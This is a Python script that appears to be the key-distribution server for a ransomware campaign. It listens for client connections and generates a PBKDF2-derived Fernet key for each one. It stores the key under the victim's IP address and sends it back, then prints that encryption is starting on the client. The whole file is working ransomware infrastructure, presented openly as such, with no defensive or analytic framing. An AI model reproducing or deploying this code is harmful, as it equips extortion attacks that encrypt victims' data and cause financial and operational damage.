#!/usr/bin/python
#coding:utf-8
import socket, thread, sys, base64, time
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
from optparse import *

parser = OptionParser(add_help_option=False)
parser.add_option("-h", "--host", type="string", dest="host")
parser.add_option("-p", "--port", type="int", dest="port")
(options, args) = parser.parse_args()
h = options.host
p = options.port

def keygen(passwd, name):
    password = passwd.encode()
    salt = b'\x82k\x19r%j\xe6\xf6\xda\x94&h9\xfd\xba\x0c'
    kdf = PBKDF2HMAC(
	    algorithm=hashes.SHA256(),
	    length=32,
	    salt=salt,
	    iterations = 1000000,
	    backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    file = open(name+".key", "wb")
    file.write(key)
    file.close()
    return key

def EchoClientHandler(clientSocket, addr) :
    try:
    	while 1:
    		client_data  = clientSocket.recv(2048)
    		if(client_data):
    			print(client_data)
    			clientSocket.send(client_data)
    			password = Fernet.generate_key()
    			print("[**] Password is: %s" %(password))
    			secret = keygen(password, addr[0])
    			print("[**] Key is: %s" %(secret))
    			clientSocket.send(secret)
    			print(clientSocket.recv(2048))
    			print("[**] The Ransomware start encryption on the client...\n")
    			clientSocket.close()
    			break
    		else :
    			clientSocket.close()
    			return
    except KeyboardInterrupt:
        print("[!] The communication between the server and the client was interrupted")
try:
    echoServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    echoServer.bind((h, p))
    echoServer.listen(10)
except IndexError:
    print("\n[!] Error script init, please verify your syntax...")
    print("[X] Quitting...")
    time.sleep(1)
    quit()

try:
	print("[*] The server is started...\n")
    while 1:
	       cSock, addr = echoServer.accept()
	       print("[!] New connection from ->  %s: %s "%(addr))
	       thread.start_new_thread(EchoClientHandler, (cSock, addr))
except KeyboardInterrupt:
    print("[!] The script was interrupted...")
    print("[X] Quitting...")
    time.sleep(1)
    quit()
